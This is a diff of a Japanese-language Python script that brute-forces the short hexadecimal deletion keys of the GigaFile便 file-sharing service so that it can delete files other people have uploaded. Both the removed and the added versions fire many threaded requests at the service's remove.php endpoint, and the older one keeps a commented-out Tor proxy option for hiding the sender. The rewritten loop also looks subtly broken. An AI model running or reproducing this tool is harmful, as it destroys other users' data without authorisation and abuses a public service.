@@ -1,33 +1,60 @@
-import requests
+import json
+import random
 import threading
 import time
-import sys
+import urllib.parse
+import urllib.request
+from queue import Queue
 
-proxies = None
-#proxies = {"http":"socks5://localhost:9050/","https":"socks5://localhost:9050/"}
-deleted = False
-url = input("ファイルurl: ")
-serverid = url.split("://")[1].split(".")[0]
-filename = url.split(".nu/")[1].split("/")[0].split("?")[0]
-hex = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f']
 
-def remover(key):
-    global deleted
-    if deleted == True:return
+def main():
+    url = input("ギガファイル便のURLを入力してください: ")
+    file_name = url.split("/")[-1]
+    server_id = url.split("/")[2]
+
+    thread_num = int(input("スレッド数を入力してください: "))
+
+    password = generate_random_string(4)
+    delete_url = f"https://{server_id}/remove.php?file={file_name}&delkey={password}"
+
+    threads = []
+    task_queue = Queue()
+
+    for _ in range(thread_num):
+        t = threading.Thread(target=delete_file, args=(task_queue, delete_url, file_name))
+        threads.append(t)
+        t.start()
+
+    for t in threads:
+        t.join()
+
+
+def delete_file(task_queue, delete_url, file_name):
     while True:
         try:
-            print("削除キー試行: "+key)
-            status = requests.get("https://"+serverid+".gigafile.nu/remove.php?file="+filename+"&delkey="+key,proxies=proxies,timeout=5).json()["status"]
-            if status == 0 and deleted == False:print("削除されました！");deleted = True
+            response = urllib.request.urlopen(delete_url)
+            result = json.loads(response.read())
+        except Exception as e:
+            print(e)
+            print("エラーが発生しました")
+            time.sleep(5)
+            continue
+
+        if result["status"] == 0:
+            print("削除に成功しました")
             break
-        except:continue
+        else:
+            password = generate_random_string(4)
+            delete_url = f"{delete_url.split('&')[0]}&delkey={password}"
+            task_queue.put(delete_url)
+            print(f"パスワード{password}が間違っています")
+            task_queue.task_done()
 
 
-for i1 in hex:
-    for i2 in hex:
-        for i3 in hex:
-            for i4 in hex:
-                if deleted:break
-                num = i1+i2+i3+i4
-                threading.Thread(target=remover,args=(num,)).start()
-                while threading.active_count() >= 250:time.sleep(1)
+def generate_random_string(length):
+    char_set = "abcdef1234567890"
+    return ''.join(random.choice(char_set) for _ in range(length))
+
+
+if __name__ == "__main__":
+    main()
